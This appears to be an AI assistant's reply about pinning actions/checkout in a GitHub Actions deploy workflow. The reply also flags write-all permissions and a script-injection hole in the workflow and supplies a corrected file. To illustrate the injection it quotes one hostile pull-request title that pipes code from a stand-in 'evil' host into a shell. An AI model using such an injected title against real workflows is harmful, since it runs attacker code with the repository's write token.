I couldn't pin the action because this session has no shell or file-editing tool. I can only read and search files. Pinning needs two things I can't do here: look up the current release and its commit SHA from GitHub, and edit the file. I won't type a SHA from memory, because a wrong one either breaks the workflow or points at a commit nobody checked. So nothing has changed yet.

**What needs pinning:** the only workflow is `.github/workflows/deploy.yml`, and it uses one action:

- `.github/workflows/deploy.yml:13`: `actions/checkout@v4`

**To get the SHA**, run these two commands and use the newest release rather than staying on v4:

```sh
gh api repos/actions/checkout/releases/latest --jq .tag_name          # e.g. v7.x.y
gh api repos/actions/checkout/commits/refs/tags/<that-tag> --jq .sha  # 40-char SHA
```

To pin it automatically instead, run `pinact run` or `ratchet pin` on a clean tree. Both rewrite the `uses:` line to a SHA and keep the version as a comment.

**The same file has worse problems than the tag**, and I'd fix them in the same change:

1. **`permissions: write-all` on a `pull_request` trigger** (line 7). Every job gets a token that can write to everything. The job only checks out code, so it needs `permissions: {}` at the top and `contents: read` on the job.
2. **Script injection** (line 14). `${{ github.event.pull_request.title }}` is pasted into the shell script before it runs. Anyone who can open a pull request can choose the title, so a title like `"; curl evil | sh; #` runs as code with that write token. Pass the title through `env:` instead.
3. The job is missing `timeout-minutes`, and `persist-credentials: false` isn't set on checkout. Without it, the token stays in `.git/config` for later steps.

Here's the corrected file. The only part left to fill in is the SHA:

```yaml
---
name: deploy

on:
  pull_request:

permissions: {}

jobs:
  deploy:
    name: Deploy
    runs-on: ubuntu-latest
    timeout-minutes: 10
    permissions:
      contents: read
    steps:
      - name: Checkout repository
        uses: actions/checkout@<40-char-sha> # <tag from releases/latest>
        with:
          persist-credentials: false

      - name: Report the pull request title
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: printf 'Title is %s\n' "$PR_TITLE"
```

Separately, a job called "deploy" that runs on every pull request is unusual. If it's meant to actually deploy, it should probably run on `push` to the main branch or on `workflow_dispatch`.

After the edit, run `actionlint` and `uvx zizmor@1.31.1 --persona=pedantic .`. If you'd like, run the `gh api` commands and paste the output, or give me a session with shell and edit access, and I'll apply the change and run both checks.
